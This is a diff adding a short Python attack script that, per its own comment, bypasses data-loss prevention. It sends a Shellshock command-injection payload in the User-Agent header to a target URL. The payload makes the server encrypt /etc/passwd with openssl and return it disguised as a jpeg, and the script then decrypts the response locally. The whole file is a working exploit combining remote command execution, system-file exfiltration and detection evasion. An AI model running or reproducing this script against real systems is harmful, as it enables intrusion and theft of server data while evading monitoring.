@@ -1,0 +1,26 @@
+#!/usr/bin/env python
+
+# Bypass DLP by encrypting and saying it's a jpeg.
+
+import binascii
+import os
+import requests
+import subprocess
+import sys
+
+raw_iv = os.urandom(16)
+raw_kx = os.urandom(16)
+iv = binascii.b2a_hex(raw_iv)
+kx = binascii.b2a_hex(raw_kx)
+
+cmd = "/usr/bin/openssl aes-256-cbc -a -salt -iv " + iv + " -K " + kx + " \
+    -in /etc/passwd"
+
+headers = {'User-agent': '() { foo; }; \
+           echo Content-type:image/jpeg;echo ;echo;' + cmd}
+
+req = requests.get(sys.argv[1], headers=headers)
+
+cmd = ["/usr/bin/openssl", "aes-256-cbc", "-a", "-d", "-iv", iv, "-K", kx]
+proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)
+proc.communicate(req.text.strip())
